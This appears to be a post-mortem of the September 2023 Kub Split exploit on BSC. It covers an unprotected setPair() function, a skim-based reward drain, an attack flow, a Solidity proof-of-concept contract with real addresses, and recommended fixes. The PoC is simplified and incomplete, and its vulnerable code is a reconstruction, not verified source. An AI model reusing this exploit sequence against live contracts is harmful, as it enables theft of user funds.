# Kub Split Staking Arbitrage Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Kub Split |
| Date | 2023-09-20 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$78,000 USD |
| Attack Type | Flash Loan + Staking Arbitrage + Skim Manipulation |
| CWE | CWE-840 (Business Logic Errors) |
| Attacker Address | `0x7Ccf451D3c48C8bb747f42F29A0CdE4209FF863e` |
| Attack Contract | `0xa7fe9c5d4b87b0d03e9bb99f4b4e76785de26b5d` |
| Vulnerable Contract | `0xc98e183d2e975f0567115cb13af893f0e3c0d0bd` (Split Token) |
| Fork Block | 32,021,100 |

## 2. Vulnerability Code Analysis

The Split token's `setPair()` function was callable externally, allowing anyone to register an arbitrary address as the pair. Combined with the `StakingRewards` contract's logic that distributes additional rewards whenever `skim()` is called on a specific pair, the attacker was able to swap out the pair and drain rewards via `skim()`.

```solidity
// Vulnerable pattern: arbitrary pair can be set
contract SplitToken is ERC20 {
    address public pair;

    // Vulnerable: pair address can be changed without access control
    function setPair(address _pair) external {
        pair = _pair;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        // Special handling for transfers to the pair
        if (to == pair) {
            // Staking reward distribution logic
            StakingRewards.notifyRewardAmount(amount * 10 / 100);
        }
        super._transfer(from, to, amount);
    }
}
```

**Vulnerability**: `Split.setPair()` is callable by anyone without access control, allowing the attacker to register their own contract as the pair and call `skim()` on the KUB/Split and BUSDT/Split pairs to extract rewards. A quintuple DODO flash loan was used to mobilize large-scale capital.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Staking Arbitrage + Skim Manipulation
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0x7Ccf451D3c48C8bb747f42F29A0CdE4209FF863e]
  │
  ├─1─▶ BUSDT_KUB_LP.sync() - Normalize initial state
  │      [BUSDT_KUB_LP: PancakeSwap Pair]
  │
  ├─2─▶ Quintuple DODO DPP Oracle Flash Loan
  │      DPPOracle1.flashLoan() → DPPOracle2 → DPPAdvanced → DPPOracle3 → DPP
  │      [BUSDT: 0x55d398326f99059fF775485246999027B3197955]
  │      [KUB: 0x808602d91e58f2d58D7C09306044b88234ab4628]
  │      Acquire large-scale funds
  │
  ├─3─▶ BUSDTToKUB() - Swap BUSDT → KUB
  │
  ├─4─▶ BUSDTToSplit() - Swap BUSDT → Split
  │      [Split: 0xc98E183D2e975F0567115CB13AF893F0E3c0d0bD]
  │
  ├─5─▶ StakingRewards1.stake() - Stake Split tokens
  │      [StakingRewards1: Staking Contract]
  │
  ├─6─▶ BUSDT_Split.skim(address(this)) - Extract surplus
  │      KUB_Split.skim(address(this)) - Extract additional surplus
  │
  ├─7─▶ Split.setPair(fakeUSDC_address) - Swap pair (no access control)
  │      [fakeUSDC: 0xa88D48a4c6D8dD6a166A71CC159A2c588Fa882BB]
  │
  ├─8─▶ fakeUSDCToBUSDT() - Convert fakeUSDC → BUSDT
  │
  ├─9─▶ StakingRewards2.sell() - Sell staking rewards
  │
  └─10─▶ Repay all flash loans + realize ~$78,000 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ISplit is IERC20 {
    function setPair(address _pair) external;
}

interface IStakingRewards {
    function stake(uint256 amount) external;
    function sell(uint256 amount) external;
    function earned(address account) external view returns (uint256);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract KubSplitExploit {
    ISplit Split = ISplit(0xc98E183D2e975F0567115CB13AF893F0E3c0d0bD);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 KUB = IERC20(0x808602d91e58f2d58D7C09306044b88234ab4628);
    IERC20 fakeUSDC = IERC20(0xa88D48a4c6D8dD6a166A71CC159A2c588Fa882BB);
    IDPPOracle DPPOracle1;
    IStakingRewards StakingRewards1;
    IStakingRewards StakingRewards2;
    Uni_Pair_V2 BUSDT_Split;
    Uni_Pair_V2 KUB_Split;
    Uni_Pair_V2 BUSDT_KUB_LP;
    Uni_Router_V2 router;
    IUniswapV2Factory factory;

    function testExploit() external {
        // Normalize initial state
        BUSDT_KUB_LP.sync();

        // Initiate quintuple flash loan
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)) * 99/100, address(this), "split1");
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata data) external {
        if (keccak256(data) == keccak256("split_final")) {
            // Swap BUSDT → KUB
            BUSDTToKUB();

            // Swap BUSDT → Split
            BUSDTToSplit();

            // Stake Split tokens
            uint256 splitBalance = Split.balanceOf(address(this));
            Split.approve(address(StakingRewards1), splitBalance);
            StakingRewards1.stake(splitBalance);

            // Extract pair surplus via skim
            BUSDT_Split.skim(address(this));
            KUB_Split.skim(address(this));

            // Swap pair (access control vulnerability)
            Split.setPair(address(fakeUSDC));

            // Convert fakeUSDC → BUSDT
            fakeUSDCToBUSDT();

            // Sell staking rewards
            StakingRewards2.sell(StakingRewards2.earned(address(this)));

            // Repay flash loans...
            BUSDT.transfer(msg.sender, quoteAmount);
        }
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-840 (Business Logic Errors) |
| Vulnerability Type | setPair() without access control, combined with skim |
| Impact Scope | Split token staking and liquidity pools |
| Explorer | [BSCscan](https://bscscan.com/address/0xc98e183d2e975f0567115cb13af893f0e3c0d0bd) |

## 6. Security Recommendations

```solidity
// Fix 1: Add onlyOwner to setPair
contract SplitToken is ERC20 {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Only admin can set pair
    function setPair(address _pair) external onlyOwner {
        pair = _pair;
        emit PairUpdated(_pair);
    }
}

// Fix 2: Apply timelock to pair changes
uint256 public constant PAIR_CHANGE_DELAY = 2 days;
address public pendingPair;
uint256 public pendingPairTime;

function proposePair(address _pair) external onlyOwner {
    pendingPair = _pair;
    pendingPairTime = block.timestamp + PAIR_CHANGE_DELAY;
}

function executePairChange() external onlyOwner {
    require(block.timestamp >= pendingPairTime, "Timelock not expired");
    pair = pendingPair;
    pendingPair = address(0);
}

// Fix 3: Decouple staking rewards from skim
// Staking reward distribution must not depend on skim calls
// Use a separate distribute() function executed explicitly by an admin
function distributeRewards() external onlyKeeper {
    uint256 rewards = pendingRewards;
    pendingRewards = 0;
    StakingRewards.notifyRewardAmount(rewards);
}
```

## 7. Lessons Learned

1. **setPair() Access Control**: The `setPair()` function in a token contract is a critical function that can alter the entire token economy. It must be restricted to admins only and protected with a timelock.
2. **Danger of skim + Reward Coupling**: When `skim()` is coupled with staking reward distribution, an attacker can repeatedly call `skim()` to extract rewards prematurely.
3. **Quintuple Flash Loan Capital Mobilization**: Chaining five DODO DPP Oracle flash loans on BSC can mobilize hundreds of millions of dollars of liquidity within a single transaction. Security analysis must account for capital mobilization at this scale.
4. **Fake Token Attack**: The pattern of an attacker deploying their own ERC20 token and incorporating it into the attack sequence indicates a complex attack structure. Protocols should restrict interactions with external tokens beyond their own.